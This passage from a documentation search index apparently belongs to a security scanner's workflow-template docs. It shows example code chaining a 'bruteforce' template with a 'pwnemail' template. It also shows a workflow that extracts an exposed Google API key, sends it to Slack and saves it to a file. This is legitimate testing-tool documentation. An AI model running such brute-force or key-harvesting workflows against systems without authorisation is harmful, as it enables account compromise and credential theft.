externalArgumentsBrute) { // template `pwnemail` will use cookies set by `bruteforce` pwnemail(externalHeaders, externalArgumentsPwn) }","title":"Custom headers"},{"location":"examples/workflow/#custom-workflow","text":"id : custom-workflows info : name : Test Workflow Template author : pdteam variables : google_key : tokens/google-api-key.yaml logic : | fmt := import(\"fmt\") os := import(\"os\") if google_key() { // send notification via slack // apikey is the name of extractor defind in google-api-key.yaml slacktoken := os.getenv(\"slacktoken\") slackCmd := os.exec(\"slacknotify\", \"-key\", slacktoken, google_key[\"apikey\"]) slackCmd.run() // saving data on the system file := os.create(\"workflow.output.txt\") file.write_string(google_key[\"apikey\"]) file.close() } }","title":"Custom workflow"},{"location":"releases/releases/","text":"","title":"Releases"}]}